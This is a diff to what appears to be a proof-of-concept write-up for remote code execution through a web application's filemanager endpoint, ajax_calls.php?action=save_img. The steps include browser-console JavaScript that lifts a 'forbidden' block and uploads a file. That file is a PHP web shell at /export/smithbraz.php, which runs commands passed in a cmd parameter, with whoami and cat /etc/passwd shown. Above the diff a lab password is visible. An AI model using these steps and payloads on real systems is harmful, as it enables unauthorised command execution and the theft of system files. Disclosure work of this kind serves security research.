@@ -314,9 +314,21 @@ Password: RedScan@2026!
 
 http://192.168.1.193:8080
 
+![RCE](./img/01.png)
 
 
+### Insert the captcha code and password again
+![RCE](./img/02.png)
 
+
+### Access ajax_calls.php file and look the "forbidden" message
+
+http://192.168.1.193:8080/admin/includes/modules/filemanager/ajax_calls.php?action=save_img
+
+![RCE](./img/03.png)
+
+
+### Open debug mode and in console box paste the code
 ```
 (async () => {
   const r = await fetch(
@@ -334,6 +346,20 @@ http://192.168.1.193:8080
 })();
 ```
 
+![RCE](./img/04.png)
+
+
+### Check status code 200 response 
+
+![RCE](./img/05.png)
+
+
+### Refresh the page by pressing F5 and observe that the "forbidden" message has disappeared.
+
+![RCE](./img/06.png)
+
+
+### Paste de following code on the console box
 ```
 fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
   method: 'POST',
@@ -345,3 +371,30 @@ fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
   })
 }).then(async r => console.log('HTTP', r.status, await r.text()))
 ```
+
+![RCE](./img/07.png)
+
+
+### Check status code 200 response
+
+![RCE](./img/08.png)
+
+
+### Access the created file in link and provide "whoami" command with "cmd" parameter:
+http://192.168.1.193:8080/export/smithbraz.php?cmd=whoami
+
+![RCE](./img/09.png)
+
+
+### Access the created file in link and provide "cat /etc/passwd" command with "cmd" parameter:
+http://192.168.1.193:8080/export/smithbraz.php?cmd=cat /etc/passwd
+
+![RCE](./img/10.png)
+
+
+
+
+
+
+
+
